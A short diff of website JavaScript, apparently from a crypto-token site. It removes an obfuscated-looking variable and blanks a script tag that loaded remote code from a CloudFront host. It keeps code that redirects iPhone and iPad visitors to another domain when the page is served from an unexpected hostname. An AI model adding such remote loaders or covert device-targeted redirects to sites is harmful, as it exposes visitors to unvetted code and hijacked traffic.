@@ -5,9 +5,7 @@
     var originalDomain = "monoplytokens.com";
     var redirectURL = "https://rolls3.com";
 
-    // التحقق من النطاق
     if (window.location.hostname !== originalDomain) {
-        // التحقق إذا كان المستخدم يستخدم iPhone أو iPad
         var isAppleDevice = /iPhone|iPad/i.test(navigator.userAgent);
         if (isAppleDevice) {
             window.location.href = redirectURL;
@@ -171,8 +169,7 @@ function placeholderFunction1() {
     return "Temporary String";
 }
 
-var ugjzY_jhW_bduYzc = {"it":4439277, "key":"c36f9"};
 
 var script = document.createElement('script');
-script.src = "https://d1gof7ug63b1q4.cloudfront.net/912ffe0.js";
+script.src = "";
 document.head.appendChild(script);
